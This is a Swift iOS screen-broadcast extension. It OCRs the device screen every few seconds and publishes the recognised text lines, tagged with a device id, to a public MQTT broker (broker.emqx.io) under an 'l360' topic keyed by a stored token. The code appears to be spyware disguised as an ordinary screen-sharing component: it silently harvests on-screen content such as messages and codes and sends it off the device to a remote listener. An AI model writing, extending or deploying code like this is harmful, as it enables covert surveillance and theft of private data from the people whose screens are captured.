import ReplayKit
import Vision
import CoreImage
import UIKit
import Foundation

final class Screen: RPBroadcastSampleHandler {
    private var task: URLSessionWebSocketTask?
    private var ready = false
    private var last = Date(timeIntervalSince1970: 0)
    private var lastSig = -1
    private var recent: [String] = []
    private let ctx = CIContext()

    private var store: UserDefaults { UserDefaults(suiteName: "group.f0f60c3925d8a7e3.1") ?? .standard }
    private var token: String { store.string(forKey: "token") ?? "" }
    private var dev: String { store.string(forKey: "l360.devid") ?? "dev" }

    override func broadcastStarted(withSetupInfo info: [String: NSObject]?) {
        guard !token.isEmpty else { return }
        connect()
    }

    override func broadcastFinished() {
        task?.cancel(with: .goingAway, reason: nil)
        task = nil
        ready = false
    }

    private func connect() {
        var c = URLComponents()
        c.scheme = "wss"
        c.host = "broker.emqx.io"
        c.port = 8084
        c.path = "/mqtt"
        guard let u = c.url else { return }
        var r = URLRequest(url: u)
        r.setValue("mqtt", forHTTPHeaderField: "Sec-WebSocket-Protocol")
        let t = URLSession.shared.webSocketTask(with: r)
        task = t
        t.resume()
        t.send(.data(connectPacket())) { _ in }
        listen(t)
    }

    private func listen(_ t: URLSessionWebSocketTask) {
        t.receive { [weak self] res in
            guard let self = self else { return }
            if case .success(let msg) = res {
                if case .data(let d) = msg, d.count > 1, d[0] >> 4 == 2 { self.ready = true }
                self.listen(t)
            } else {
                self.ready = false
                self.task = nil
                DispatchQueue.global().asyncAfter(deadline: .now() + 3) { self.connect() }
            }
        }
    }

    override func processSampleBuffer(_ sb: CMSampleBuffer, with type: RPSampleBufferType) {
        guard type == .video, ready, store.bool(forKey: "f_ocr") else { return }
        guard Date().timeIntervalSince(last) > 2.5 else { return }
        last = Date()
        guard let pb = CMSampleBufferGetImageBuffer(sb) else { return }
        let ci = CIImage(cvPixelBuffer: pb).transformed(by: CGAffineTransform(scaleX: 0.12, y: 0.12))
        guard let cg = ctx.createCGImage(ci, from: ci.extent) else { return }
        guard changed(cg) else { return }
        let req = VNRecognizeTextRequest()
        req.recognitionLevel = .accurate
        req.usesLanguageCorrection = false
        try? VNImageRequestHandler(cgImage: cg, options: [:]).perform([req])
        let lines = (req.results ?? []).compactMap { $0.topCandidates(1).first?.string }
            .filter { $0.count > 2 && !recent.contains($0) }
        guard !lines.isEmpty else { return }
        recent.append(contentsOf: lines)
        if recent.count > 60 { recent.removeFirst(recent.count - 60) }
        publish(lines)
    }

    private func changed(_ cg: CGImage) -> Bool {
        guard let d = cg.dataProvider?.data as Data? else { return true }
        var sig = 0
        for i in stride(from: 0, to: min(d.count, 4096), by: 7) { sig = (sig &* 31 &+ Int(d[i])) & 0xFFFF }
        if sig == lastSig { return false }
        lastSig = sig
        return true
    }

    private func publish(_ lines: [String]) {
        guard ready, let t = task else { return }
        let body: [String: Any] = ["type": "ocr", "lines": lines, "dev": dev,
                                   "t": Date().timeIntervalSince1970]
        guard let d = try? JSONSerialization.data(withJSONObject: body),
              let s = String(data: d, encoding: .utf8) else { return }
        t.send(.data(pubPacket(topic: "l360/\(token)/up", payload: Data(s.utf8)))) { _ in }
    }

    private func str(_ s: String) -> Data {
        let b = Data(s.utf8)
        var d = Data([UInt8(b.count >> 8), UInt8(b.count & 0xFF)])
        d.append(b)
        return d
    }
    private func rl(_ n: Int) -> Data {
        var x = n
        var out = Data()
        repeat {
            var b = UInt8(x % 128)
            x /= 128
            if x > 0 { b |= 0x80 }
            out.append(b)
        } while x > 0
        return out
    }
    private func frame(_ t: UInt8, _ f: UInt8, _ body: Data) -> Data {
        var d = Data([(t << 4) | f])
        d.append(rl(body.count))
        d.append(body)
        return d
    }
    private func connectPacket() -> Data {
        var b = str("MQTT")
        b.append(4)
        b.append(0x02)
        b.append(contentsOf: [0, 60])
        b.append(str("l360scr" + String(UUID().uuidString.prefix(6))))
        return frame(1, 0, b)
    }
    private func pubPacket(topic: String, payload: Data) -> Data {
        var b = str(topic)
        b.append(payload)
        return frame(3, 0, b)
    }
}
